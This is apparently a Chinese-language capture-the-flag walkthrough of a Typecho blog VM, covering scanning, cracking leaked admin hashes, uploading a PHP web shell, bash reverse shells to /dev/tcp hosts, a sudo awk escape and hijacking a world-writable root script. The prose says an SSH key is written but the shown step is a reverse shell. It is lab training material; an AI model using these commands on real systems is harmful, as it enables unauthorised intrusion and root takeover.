# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 09:15 EST
Nmap scan report for 192.168.21.6
Host is up (0.00033s latency).
MAC Address: 08:00:27:C0:12:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.92 seconds
```

端口扫描


```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 09:17 EST
Nmap scan report for 192.168.21.6
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:32:5b:78:d0:f4:3c:9f:05:1a:a7:13:91:3e:38:c1 (RSA)
|   256 72:07:82:15:26:ce:13:34:e8:42:cf:da:de:e2:a7:14 (ECDSA)
|_  256 fc:9c:66:46:86:60:1a:29:32:c6:1f:ec:b2:47:b8:74 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Typecho 1.2.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Zacarx's blog
MAC Address: 08:00:27:C0:12:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 192.168.21.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.98 seconds
```

# 漏洞利用

80端口是一个blog，目录扫描


```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,zip,git,jpg,png
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,html,php,txt,zip,git,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 6806]
/.php                 (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://192.168.21.6/admin/]                                                          
/install              (Status: 301) [Size: 314] [--> http://192.168.21.6/install/]                                                        
/install.php          (Status: 302) [Size: 0] [--> http://192.168.21.6/]                                                                  
/sql                  (Status: 301) [Size: 310] [--> http://192.168.21.6/sql/]                                                            
/var                  (Status: 301) [Size: 310] [--> http://192.168.21.6/var/]                                                            
/usr                  (Status: 301) [Size: 310] [--> http://192.168.21.6/usr/]                                                            
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6/sql -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x sql,sql.gz,sql.zip,sql.bak,sql.old,sql.backup
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6/sql
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sql.gz,sql.zip,sql.bak,sql.old,sql.backup,sql
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/new.sql              (Status: 200) [Size: 102400]
```

把new.sql下载下来看一下发现暴露了版本

<img width="265" height="77" alt="图片" src="https://github.com/user-attachments/assets/e9355eb7-b5cf-4994-9cba-a546e0f5ce19" />

用sqlite3打开

```
┌──(kali㉿kali)-[~]
└─$ sqlite3 new.sql
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
typechocomments       typechometas          typechousers        
typechocontents       typechooptions      
typechofields         typechorelationships
sqlite> select * from typechousers;
1|zacarx|$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.|zacarx@qq.com|http://www.zacarx.com|zacarx|1690361071|1692694072|1690364323|administrator|9ceb10d83b32879076c132c6b6712318
2|admin|$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0|admin@11.com||admin|1690364171|1690365357|1690364540|administrator|5664b205a3c088256fdc807791061a18
```

爆破一下

```
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt 1
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (admin)
```

在/admin登录，在设置中设置允许上传php文件，然后传入我们的shell

<img width="682" height="255" alt="图片" src="https://github.com/user-attachments/assets/816e23b0-0308-43ba-9297-8ee105bec69d" />

上传一个php文件，尝试访问

<img width="869" height="119" alt="图片" src="https://github.com/user-attachments/assets/52f198b6-3938-40a6-97c3-6bcaab7972de" />

执行反弹shell：http://192.168.21.6/usr/uploads/2026/02/3848067895.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.21.7/1234%200%3E%261%27

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.6] 36684
bash: cannot set terminal process group (1160): Inappropriate ioctl for device
bash: no job control in this shell
www-data@za_1:/var/www/html/usr/uploads/2026/02$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

可以不需要密码执行awk，awk是一门脚本语言，内建函数system("command")可以直接执行系统命令。

```
www-data@za_1:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on za_1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on za_1:
    (za_1) NOPASSWD: /usr/bin/awk
www-data@za_1:/var/www$ sudo -u za_1 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
< -u za_1 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
id
uid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
za_1@za_1:~$ ls -la
ls -la
total 44
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 .
drwxr-xr-x 3 root root 4096 Jul 26  2023 ..
lrwxrwxrwx 1 za_1 za_1    9 Aug 22  2023 .bash_history -> /dev/null
-rw-r--r-- 1 za_1 za_1  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 za_1 za_1 3771 Apr  4  2018 .bashrc
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .cache
drwx------ 3 za_1 za_1 4096 Jul 26  2023 .gnupg
-rw-r--r-- 1 za_1 za_1  807 Apr  4  2018 .profile
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .root
drwx------ 2 za_1 za_1 4096 Jul 26  2023 .ssh
-rw-r--r-- 1 za_1 za_1    0 Jul 26  2023 .sudo_as_admin_successful
-rw------- 1 za_1 za_1  991 Jul 26  2023 .viminfo
-rw-r--r-- 1 za_1 za_1   23 Jul 26  2023 user.txt
za_1@za_1:~$ cd .root
cd .root
za_1@za_1:~/.root$ ls -la
ls -la
total 12
drwxr-xr-x 2 za_1 za_1 4096 Jul 26  2023 .
drwxr-xr-x 6 za_1 za_1 4096 Aug 22  2023 ..
-rwxrwxrwx 1 root root  117 Jul 26  2023 back.sh
za_1@za_1:~/.root$ cat back.sh
cat back.sh
#!/bin/bash


cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql

bash -i >&/dev/tcp/10.0.2.18/999 0>&1
```

我们把私钥写入/.ssh/authorized_keys，然后ssh重新连接

```
za_1@za_1:~/.root$ nano back.sh 
za_1@za_1:~/.root$ cat back.sh 
#!/bin/bash

cp /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql

bash -i >&/dev/tcp/192.168.21.7/1234 0>&1

echo '#!/bin/bash' > back.sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.6] 42954
bash: cannot set terminal process group (4448): Inappropriate ioctl for device
bash: no job control in this shell
root@za_1:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
